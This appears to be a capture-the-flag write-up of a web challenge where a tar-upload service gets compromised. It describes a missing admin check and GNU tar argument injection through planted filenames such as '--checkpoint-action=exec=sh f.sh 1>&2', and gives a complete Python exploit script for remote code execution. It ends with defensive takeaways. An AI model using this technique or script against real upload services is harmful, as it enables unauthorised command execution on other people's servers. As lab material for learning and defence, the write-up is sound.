01 //

reconnaissance

recon / discovery

The site is a Wildlife Archive served by Express behind Nginx. The homepage sets a visitor cookie, but the visitor notes form relies entirely on client-side localStorage. A quick check of robots.txt mentions field archive tooling.

Running a quick directory sweep uncovers a hidden /staging endpoint.

02 //

archive intake flow

analysis

The /staging endpoint accepts a .tar upload. The server creates a unique workspace directory, extracts the tar file there, and displays an extraction log page along with the current workspace files.

The page also exposes a /additional/<id> endpoint to upload more files to the same workspace. A client-side comment claims this is "Only for admins," but the server accepted my requests without enforcing authorization.

03 //

tar argument injection

exploit / rce

The extraction logs echo the raw output from GNU tar. On each additional upload pass, the server passes every existing workspace filename as a command-line argument to the tar command.

Since I controlled the filenames created in my workspace through my tar uploads, I was able to plant files literally named --checkpoint=1 and --checkpoint-action=exec=sh f.sh 1>&2. I included a script file f.sh containing my shell commands.

Dead End: Directory Traversal

I initially tried directly traversing directories via the staging file upload (e.g., using ../../ in filenames inside the tar archive) to overwrite server configs. While tar extracted these paths, the extraction was chrooted tightly into the temporary workspace, preventing any arbitrary file overwrites.

When I uploaded a subsequent tar file to trigger the execution, tar parsed those filenames as options. It reached the checkpoint, executed my shell script, and printed the output directly into the extraction logs.

import requests, io, tarfile, re, html

B = "https://staywild-7f5dfaeec81f.inst.omnictf.com"
C = {"role": "admin"}

def mktar(entries):
    buf = io.BytesIO()
    t = tarfile.open(fileobj=buf, mode="w")
    for name, data in entries:
        b = data.encode()
        ti = tarfile.TarInfo(name)
        ti.size = len(b)
        ti.mode = 0o755
        t.addfile(ti, io.BytesIO(b))
    t.close()
    return buf.getvalue()

def newws():
    r = requests.post(B+"/staging",
                      files={"file": ("first.tar", mktar([("note.txt", "hi")]), "application/x-tar")},
                      cookies=C, allow_redirects=False)
    return r.headers["location"].split("/")[-1]

def add(ws, entries, fname="x.tar"):
    return requests.post(B+f"/additional/{ws}",
                         files={"file": (fname, mktar(entries), "application/x-tar")}, cookies=C)

def logs(ws):
    r = requests.get(B+f"/staging/{ws}", cookies=C).text
    m = re.search(r'id="allLogs"[^>]*>(.*?)</pre>', r, re.S)
    if not m:
        return r
    return html.unescape(m.group(1))

def run(script):
    ws = newws()
    add(ws, [("f.sh", script),
             ("--checkpoint=1", "x"),
             ("--checkpoint-action=exec=sh f.sh 1>&2", "x")])   # plant options
    add(ws, [("trigger.txt", "go")])                            # trigger
    out = logs(ws)
    i = out.find("[extraction 3]")
    if i == -1:
        return out
    return out[i:i+3500]

appendix

takeaways

Never pass untrusted filenames as command-line arguments. Any name beginning with a dash becomes an option. You should terminate options with -- or use libraries that do not shell out.

The client-side gating mechanism for the additional uploads endpoint provided no actual security.
